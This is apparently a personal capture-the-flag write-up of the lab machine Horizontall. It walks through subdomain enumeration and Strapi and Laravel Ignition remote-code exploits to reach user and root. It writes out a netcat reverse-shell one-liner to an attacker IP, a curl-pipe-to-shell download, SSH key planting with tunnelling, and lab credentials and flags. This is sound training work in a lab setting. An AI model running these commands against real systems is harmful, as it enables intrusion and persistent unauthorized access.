Box Info Horizontall.htb
OS: Linux \
IP: 10.10.11.105 \

Part I Skills learned::  
SSH, nginx, reverse shells \
CVE-2019-18818, CVE-2019-19609, CVE-2021-3129 

---
**Enumeration::**

nmap -p- -A -oN Horizontall.txt ${IP} ::
```
22 SSH 
80 http nginx 1.14.0 (Ubuntu)

```
gobuster dir -u http://<ip> -w /usr/share/wordlists/directory-list-1.0.txt :: nothing
ffuf :: nothing
nikto -h http://horizontall.htb :: nothing
Very little enumeration... ***but***

##Because it's running Nginx, it's possible to have VHOSTs::##
gobuster vhost -u http://horizontall.htb -w /usr/share/wordlists/subdomains-top1million.txt(see url) -t 150 ::
 1) Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
 2) **Add new dir to /etc/hosts**
 3) gobuster u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 ::
 4) Found: /admin, /users, /reviews, /Reviews, /Users, /Admin, /REVIEWS, 
```
 curl GET http://api-prod.horizontall.htb/<dir> show reviews w/ names. /Admin shows .js
 http://.../admin :: ***Strapi*** login page
    viewing .js scripts show verison of strapi. See ![strapi_version](Screenshots/strapi_verison_find.png)
        + "strapi-plugin-content-type-builder@3.0.0-beta.17.4"
 http://.../reviews :: .json review info
 http://.../Users :: 403
 http://.../%C0 :: 400
```
---
**OSINT::**
[CVE's](https://www.cvedetails.com/vulnerability-list/vendor_id-22287/product_id-75293/Strapi-Strapi.html)
[exploit.py](https://www.exploit-db.com/exploits/50239)

After running exploit.py, shell becomes broken. see ![broken shell](Screenshots/strapi_exploit_broken_shell.png)
 + "Remember this is a blind RCE dont expect to see output"
 + Now login with credentials:: admin:SuperStrongPassword1 see ![creds](Screenshots/strapi_exploit_broken_shell.png)
 + File upload present in admin portal.
   + try to upload reverse shell::
 `victim -$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 5555 >/tmp/f` see ![Shell](Screenshots/strapi_shell.png)
 `attack -$ nc -lnvp <lister port> :: $whoami strapi` 
 `attack -$ cat /home/developer/user.txt :: e0a070503b5ecb060d4ec125c811270b`

---
**Root::**
+ netstat shows ports && ips
+ sudo -l nothing, very low permissions.
+ find / -perm /6000
  + GTFO's: No luck
  + netstat -nutpl :: 
  + 8000 - curl: Laravel v8 (PHP v7.4.18)
  + 3306 - mysql
  + 22 - ssh
  + 1337 - "welcome to your api - Welcome."

##**Linpeas.sh::**##
```
+ python -m http.server 8081
+ curl <attack tun ip>:8081/linpeas.sh | sh
    + see ![horizontal_ports](Screenshots/linpeas_ports_horizontall.png)

UN:PW for mysql (from linpeas.sh): developer:#J!:F9Zt2u :: No luck
SSH keys avaliable : /opt/strapi/myapi/node_modules/..etc.etc No luck
sudo verison 1.8.21p2
curl 127.0.0.1:8000 ::
    + https://vapor.laravel.com
    + see link laravel_exploit(2)
    exploit: CVE-2021-3129_exploit || laravel-igition-rce
```

##**CVE-2021-3129 - laravel-igition-rce**##
serve file: `$ python -m http.server 8080`
attacker  ` $ cd tmp/ && wget http://<attack-ip>:8080/laravelexploit.py laravelexploit.py`
`chmod +x laravelexploit.py`
`$ php -d\'phar.readonly=0\' ./phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system id\n`
`$ ./laravelexlpoit.py http://127.0.0.1:8000 path/to/exploit.phar`
Does NOT WORK:: 

##**SSH::**##
```
attacker: ssh-keygen -t rsa -C "random comment"
attacker: ${cat id_rsa.pub} :: "AAAA.....root@kali"
victim ~/.ssh/: echo ${cat id_rsa.pub} >> authorized_keys
attacker:ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 :: see![rev_tunnel](Screenshots/horizontall_ssh_rev_tunnel.png)
searchsploit laravel:: /usr/share/exploitdb/exploits/webapps/php/49424.py
```
W/ ssh_rev_tunnel 127.0.0.1:8000 is now accessible. 

`attacker: 'python3 ./49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'cat /root/root.txt'`
root:: 2d171f3a6561a8f1db0e27b8d3be6546 see ![path_diff](Screenshots/horizontall_path_script_change_phpggc.png)
---
**References::**
[Discovery_DNS_subdomains_etc](https://github.com/danielmiessler/SecLists)
[Linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/refs/pull/252/merge)
[Lavarel_exploit](https://github.com/nth347/CVE-2021-3129_exploit)
[lavarel_exploit2](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py)
